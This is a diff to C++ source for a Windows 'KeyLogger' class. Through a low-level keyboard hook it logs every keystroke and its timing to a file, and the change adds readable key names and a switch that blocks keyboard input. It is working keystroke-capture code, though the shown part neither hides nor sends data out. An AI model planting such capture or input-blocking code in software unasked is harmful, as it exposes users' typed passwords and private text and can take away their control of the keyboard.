@@ -33,24 +33,30 @@ static std::string VkCodeToString(DWORD vkCode)
 
     // For other keys, we might do a switch-case
     switch (vkCode) {
+        case VK_LWIN:       return "Left Windows";
+        case VK_RWIN:       return "Right Windows";
+        case VK_LSHIFT:     return "Left Shift";
+        case VK_RSHIFT:     return "Right Shift";
+        case VK_LCONTROL:   return "Left Control";
+        case VK_RCONTROL:   return "Right Control";
+        case VK_LMENU:      return "Left Alt";
+        case VK_RMENU:      return "Right Alt";
         case VK_RETURN:     return "Enter";
         case VK_BACK:       return "Backspace";
         case VK_TAB:        return "Tab";
         case VK_SPACE:      return "Space";
         case VK_ESCAPE:     return "Escape";
-        case VK_SHIFT:      return "Shift";
-        case VK_CONTROL:    return "Control";
-        case VK_MENU:       return "Alt";
-        case VK_CAPITAL:    return "CapsLock";
-        case VK_LEFT:       return "LeftArrow";
-        case VK_RIGHT:      return "RightArrow";
-        case VK_UP:         return "UpArrow";
-        case VK_DOWN:       return "DownArrow";
+        case VK_CAPITAL:    return "Caps Lock";
+        case VK_LEFT:       return "Left Arrow";
+        case VK_RIGHT:      return "Right Arrow";
+        case VK_UP:         return "Up Arrow";
+        case VK_DOWN:       return "Down Arrow";
         case VK_DELETE:     return "Delete";
+        case VK_INSERT:     return "Insert";
         case VK_HOME:       return "Home";
         case VK_END:        return "End";
-        case VK_PRIOR:      return "PageUp";
-        case VK_NEXT:       return "PageDown";
+        case VK_PRIOR:      return "Page Up";
+        case VK_NEXT:       return "Page Down";
         case VK_F1:         return "F1";
         case VK_F2:         return "F2";
         case VK_F3:         return "F3";
@@ -88,6 +94,11 @@ LRESULT CALLBACK KeyLogger::KeyStrokeLogger(int nCode, WPARAM wParam, LPARAM lPa
 
         // Access the singleton instance instead of creating temporary instances
         static KeyLogger& logger = KeyLogger::GetInstance();
+
+        // Check if input is blocked
+        if (logger.blockInput) {
+            return 1; // Block the input
+        }
         
         // We'll use static-based timing for demonstration
         static auto s_lastTime = std::chrono::steady_clock::now();
@@ -103,10 +114,7 @@ LRESULT CALLBACK KeyLogger::KeyStrokeLogger(int nCode, WPARAM wParam, LPARAM lPa
 }
 
 // Constructor
-KeyLogger::KeyLogger()
-    : keyboardHook(nullptr)
-{
-}
+KeyLogger::KeyLogger() : keyboardHook(nullptr), blockInput(false) {}
 
 // Destructor
 KeyLogger::~KeyLogger()
@@ -154,6 +162,11 @@ void KeyLogger::LogKeyStroke(DWORD vkCode, int interval)
             << " (" << vkCode << ") "
             << "- Interval: " << interval << "ms\n";
     logFile.flush();
+}
+
+void KeyLogger::SetBlockInput(bool block)
+{
+    blockInput = block;
 }
 
 // Singleton implementation
